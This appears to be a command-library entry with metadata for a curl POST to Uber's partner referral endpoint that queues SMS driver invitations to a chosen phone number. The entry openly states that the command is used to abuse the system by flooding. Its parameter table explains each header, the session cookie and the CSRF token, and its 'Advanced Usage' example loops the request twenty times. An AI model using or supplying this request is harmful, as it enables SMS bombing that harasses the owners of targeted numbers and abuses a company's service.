---
id: cmd-uber-post-001
data: >-
  curl -X POST https://partners.uber.com/driver_invitations -H "Content-Type:
  application/json" -H "X-Requested-With: XMLHttpRequest" -H "Referer:
  https://partners.uber.com/referrals/" -b "Cookie:
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
  -d
  '{"_csrf_token":"1464319290-01-TE_leQUArIag4-5PKfW4wUkBccZdc_thW8kqNBmFFu4=","emails":[],"mobiles":["+████████"],"source":"dashboard"}'
tags:
  - api
  - http-post
  - sms-invite
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:39.595Z'
verified: false
validated: true
submitted: true
---
# send-uber-invitation-post

## Command

```bash
curl -X POST https://partners.uber.com/driver_invitations \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://partners.uber.com/referrals/" \
  -b "Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" \
  -d '{"_csrf_token":"1464319290-01-TE_leQUArIag4-5PKfW4wUkBccZdc_thW8kqNBmFFu4=","emails":[],"mobiles":["+████████"],"source":"dashboard"}'
```

## Description

Sends a driver invitation via Uber's referral API, queuing an SMS to the specified mobile number. Used to abuse the system by repeating for flooding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-H "X-Requested-With: XMLHttpRequest"` | Mimics AJAX request | Yes |
| `-H "Referer: https://partners.uber.com/referrals/"` | Sets referer header | Yes |
| `-b "Cookie: ..."` | Includes session cookie | Yes |
| `-d '{...}'` | JSON payload with CSRF, mobiles array, etc. | Yes |
| `mobiles` | Array with target phone (e.g., ["+1XXXXXXXXXX"]) | Yes |
| `_csrf_token` | Valid token from dashboard | Yes |
| `source` | Invitation source (e.g., "dashboard") | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://partners.uber.com/driver_invitations -H "Content-Type: application/json" -d '{"mobiles":["+1XXXXXXXXXX"]}'
```

### Advanced Usage

```bash
# With full headers and loop for multiple sends
for i in {1..20}; do curl ... ; done
```

## Expected Output

HTTP/1.1 200 OK with JSON response like {"success": true}, triggering queued SMS send.

## Related

- [[commands/zap-fuzz-endpoint]]
- [[procedures/Trigger-Initial-SMS-Send]]
